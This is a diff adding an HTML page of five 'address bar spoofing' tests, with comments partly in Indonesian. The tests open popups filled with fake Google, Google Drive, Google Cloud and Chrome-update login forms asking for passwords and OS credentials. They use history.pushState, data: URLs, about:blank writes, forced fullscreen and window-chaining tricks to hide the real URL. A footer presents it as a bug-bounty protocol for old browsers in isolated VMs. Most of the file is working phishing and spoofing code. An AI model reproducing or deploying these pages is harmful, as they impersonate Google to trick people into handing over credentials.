@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>Address Bar Manipulation Tests</h1>
+
+<button onclick="test1()">Test 1: Google Analytics Endpoint</button>
+<button onclick="test2()">Test 2: About:Blank + History API</button>
+<button onclick="test3()">Test 3: Data URL Technique</button>
+<button onclick="test4()">Test 4: Chrome Extension Spoof</button>
+<button onclick="test5()">Test 5: Multiple Window Chain</button>
+
+<script>
+// ========== TEST 1: Google Analytics Endpoint ==========
+function test1() {
+    // Endpoint Google yang mungkin return minimal content
+    const endpoints = [
+        "https://www.google.com/gen_204",
+        "https://www.google.com/csi",
+        "https://www.google.com/complete/search",
+        "https://clients1.google.com/complete/search",
+        "https://www.google-analytics.com/j/collect",
+        "https://www.google.com/pagead/1p-user-list/"
+    ];
+    
+    const win = window.open(endpoints[Math.floor(Math.random() * endpoints.length)], 
+                           "_blank", "width=500,height=400,location=yes");
+    
+    setTimeout(() => {
+        try {
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head><title>Google Security Alert</title></head>
+                <body style="background: #f8f9fa; padding: 40px;">
+                    <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+                        <h2 style="color: #d93025;">⚠️ Security Verification Required</h2>
+                        <p>Please verify your identity to continue using Google services.</p>
+                        <input type="email" placeholder="Enter your email" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px;">
+                        <input type="password" placeholder="Enter your password" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px;">
+                        <button style="background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; width: 100%;">Verify Identity</button>
+                    </div>
+                    <script>
+                        // Try to manipulate history if possible
+                        try {
+                            history.replaceState({}, "Google", "/");
+                        } catch(e) {}
+                    <\/script>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            console.log("Test 1 executed - Endpoint manipulation");
+        } catch(e) {
+            console.log("Test 1 failed:", e.message);
+        }
+    }, 2000);
+}
+
+// ========== TEST 2: About:Blank + History API ==========
+function test2() {
+    const win = window.open("about:blank", "_blank", "width=550,height=450");
+    
+    // Try to push state with Google URL (old technique)
+    setTimeout(() => {
+        try {
+            // Write phishing content
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>accounts.google.com</title>
+                    <script>
+                        // Attempt to manipulate browser history
+                        try {
+                            // Old Firefox/Chrome bug techniques
+                            window.history.pushState({}, "Google", "https://accounts.google.com");
+                            
+                            // Try to change URL without reload
+                            location.hash = "#https://accounts.google.com";
+                            
+                            // Some browsers show different URL for data: URIs
+                            if(window.location.protocol === 'about:') {
+                                document.title = "Google Account";
+                            }
+                        } catch(e) {}
+                        
+                        // Auto-fullscreen on interaction
+                        document.addEventListener('click', function() {
+                            if(document.documentElement.requestFullscreen) {
+                                document.documentElement.requestFullscreen();
+                            } else if(document.documentElement.webkitRequestFullscreen) {
+                                document.documentElement.webkitRequestFullscreen();
+                            }
+                        });
+                    <\/script>
+                </head>
+                <body style="background: #fff; font-family: Arial;">
+                    <div style="max-width: 400px; margin: 50px auto; padding: 30px; border: 1px solid #ddd; border-radius: 8px;">
+                        <div style="text-align: center; margin-bottom: 20px;">
+                            <div style="color: #4285f4; font-size: 40px; margin-bottom: 10px;">G</div>
+                            <h2>Sign in</h2>
+                            <p style="color: #666;">with your Google Account</p>
+                        </div>
+                        <input type="email" placeholder="Email or phone" style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px;">
+                        <input type="password" placeholder="Password" style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px;">
+                        <button style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px;">Next</button>
+                    </div>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            console.log("Test 2 executed - about:blank manipulation");
+        } catch(e) {
+            console.log("Test 2 failed:", e.message);
+        }
+    }, 500);
+}
+
+// ========== TEST 3: Data URL Technique ==========
+function test3() {
+    // Data URL dengan encoded HTML
+    const fakePage = encodeURIComponent(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Google Drive - Security Check</title>
+            <style>
+                body { font-family: Arial; background: #f8f9fa; margin: 0; padding: 20px; }
+                .container { max-width: 480px; margin: 40px auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+                .logo { color: #4285f4; font-size: 48px; text-align: center; margin-bottom: 20px; }
+                input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 6px; font-size: 16px; }
+                button { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-size: 16px; margin-top: 20px; }
+            </style>
+            <script>
+                // Force fullscreen on any click
+                document.body.addEventListener('click', function() {
+                    if(document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen().catch(e => {});
+                    }
+                });
+                
+                // Try to spoof URL in console/status
+                window.onload = function() {
+                    try {
+                        // Some browsers show data: URL differently
+                        document.title = "Google Drive - " + new Date().toLocaleTimeString();
+                    } catch(e) {}
+                };
+            <\/script>
+        </head>
+        <body>
+            <div class="container">
+                <div class="logo">📁</div>
+                <h2 style="text-align: center; color: #202124;">Google Drive Access Required</h2>
+                <p style="text-align: center; color: #5f6368;">Verify your identity to access shared files</p>
+                <input type="email" placeholder="Enter your Google email">
+                <input type="password" placeholder="Enter your password">
+                <button>Verify and Continue</button>
+            </div>
+        </body>
+        </html>
+    `);
+    
+    const win = window.open(`data:text/html;charset=utf-8,${fakePage}`, 
+                          "_blank", "width=600,height=500,location=no");
+    
+    console.log("Test 3 executed - Data URL technique");
+}
+
+// ========== TEST 4: Chrome Extension Spoof ==========
+function test4() {
+    // Teknik spoof chrome-extension:// URLs (historical bug)
+    const win = window.open("about:blank", "_blank", "width=500,height=400");
+    
+    setTimeout(() => {
+        try {
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>chrome-extension://[a-z0-9]/</title>
+                    <script>
+                        // Try to simulate extension URL (old bugs)
+                        try {
+                            // Some browsers would show parent window's URL
+                            window.name = "chrome-extension-frame";
+                            
+                            // Try to trigger extension-like behavior
+                            if(window.performance && performance.mark) {
+                                performance.mark('extension_load');
+                            }
+                        } catch(e) {}
+                        
+                        // Hidden iframe technique (old)
+                        setTimeout(() => {
+                            try {
+                                const iframe = document.createElement('iframe');
+                                iframe.style.display = 'none';
+                                iframe.src = 'https://www.google.com/gen_204';
+                                document.body.appendChild(iframe);
+                            } catch(e) {}
+                        }, 1000);
+                    <\/script>
+                </head>
+                <body style="background: #1a1a1a; color: white; padding: 30px; font-family: system-ui;">
+                    <h2 style="color: #8ab4f8;">🔒 Chrome Security Update</h2>
+                    <p>Your browser requires verification to install critical updates.</p>
+                    <div style="background: #292a2d; padding: 20px; border-radius: 8px; margin: 20px 0;">
+                        <p>⚠️ Please enter your Windows/Mac credentials to continue:</p>
+                        <input type="text" placeholder="Username" style="width: 100%; padding: 10px; margin: 10px 0; background: #3c3c3c; border: 1px solid #5f6368; color: white; border-radius: 4px;">
+                        <input type="password" placeholder="Password" style="width: 100%; padding: 10px; margin: 10px 0; background: #3c3c3c; border: 1px solid #5f6368; color: white; border-radius: 4px;">
+                        <button style="background: #0b57d0; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; margin-top: 10px;">Verify & Update</button>
+                    </div>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            console.log("Test 4 executed - Extension spoof");
+        } catch(e) {
+            console.log("Test 4 failed:", e.message);
+        }
+    }, 1000);
+}
+
+// ========== TEST 5: Multiple Window Chain ==========
+function test5() {
+    // Chain of windows untuk confuse browser UI
+    const win1 = window.open("https://www.google.com/gen_204", "win1", "width=300,height=200,left=100,top=100");
+    
+    setTimeout(() => {
+        const win2 = window.open("about:blank", "win2", "width=500,height=400,left=150,top=150");
+        
+        setTimeout(() => {
+            try {
+                win2.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Google Cloud Console</title>
+                        <script>
+                            // Close first window
+                            try { window.opener.win1.close(); } catch(e) {}
+                            
+                            // Focus manipulation
+                            window.onblur = function() {
+                                setTimeout(() => window.focus(), 100);
+                            };
+                            
+                            // Fullscreen triggers
+                            const inputs = document.querySelectorAll('input');
+                            inputs.forEach(input => {
+                                input.addEventListener('focus', function() {
+                                    if(document.documentElement.requestFullscreen) {
+                                        document.documentElement.requestFullscreen();
+                                    }
+                                });
+                            });
+                        <\/script>
+                    </head>
+                    <body style="background: #f1f3f4; padding: 40px;">
+                        <div style="max-width: 450px; margin: 0 auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.1);">
+                            <div style="text-align: center; margin-bottom: 30px;">
+                                <div style="font-size: 40px; color: #4285f4; margin-bottom: 10px;">☁️</div>
+                                <h2 style="color: #202124;">Google Cloud Authentication</h2>
+                                <p style="color: #5f6368;">Required for project access</p>
+                            </div>
+                            <input type="email" placeholder="Cloud email address" style="width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 6px; font-size: 16px;">
+                            <input type="password" placeholder="Password" style="width: 100%; padding: 14px; margin-bottom: 25px; border: 1px solid #dadce0; border-radius: 6px; font-size: 16px;">
+                            <button style="width: 100%; padding: 14px; background: #34a853; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 500;">Authenticate</button>
+                        </div>
+                    </body>
+                    </html>
+                `);
+                win2.document.close();
+                win2.focus();
+                console.log("Test 5 executed - Window chain");
+            } catch(e) {
+                console.log("Test 5 failed:", e.message);
+            }
+        }, 1500);
+    }, 800);
+}
+
+// Auto-run tests with logging
+console.log(`
+================================================================
+ADDRESS BAR SPOOFING TEST SUITE
+Browser: ${navigator.userAgent}
+Time: ${new Date().toISOString()}
+================================================================
+Tests available:
+1. Google Analytics Endpoint manipulation
+2. About:Blank + History API
+3. Data URL technique  
+4. Chrome Extension spoof
+5. Multiple Window chain
+================================================================
+`);
+</script>
+
+<div style="margin-top: 40px; padding: 20px; background: #f5f5f5; border-radius: 10px; border: 1px solid #ddd;">
+    <h3>📋 Bug Bounty Testing Protocol:</h3>
+    <p><strong>Target Browsers untuk Testing:</strong></p>
+    <ul>
+        <li>Chrome 70-79 (2018-2019)</li>
+        <li>Firefox 60-68</li>
+        <li>Safari 11-12</li>
+        <li>Edge Legacy (pre-Chromium)</li>
+        <li>Mobile Browsers dengan WebView lama</li>
+    </ul>
+    
+    <p><strong>Testing Methodology:</strong></p>
+    <ol>
+        <li>Install browser versi lama di VM terisolasi</li>
+        <li>Disable automatic updates</li>
+        <li>Test setiap technique dengan screen recording</li>
+        <li>Document exact browser version dan OS</li>
+        <li>Check console untuk SOP/CSP errors</li>
+    </ol>
+    
+    <p><strong>Expected Results (jika bug exist):</strong></p>
+    <ul>
+        <li>Address bar shows legitimate URL (Google) tetapi content berbeda</li>
+        <li>Address bar blank/empty setelah manipulasi</li>
+        <li>Fullscreen mode hide browser UI completely</li>
+        <li>User tidak bisa melihat actual URL</li>
+    </ul>
+</div>
+
+</body>
+</html>
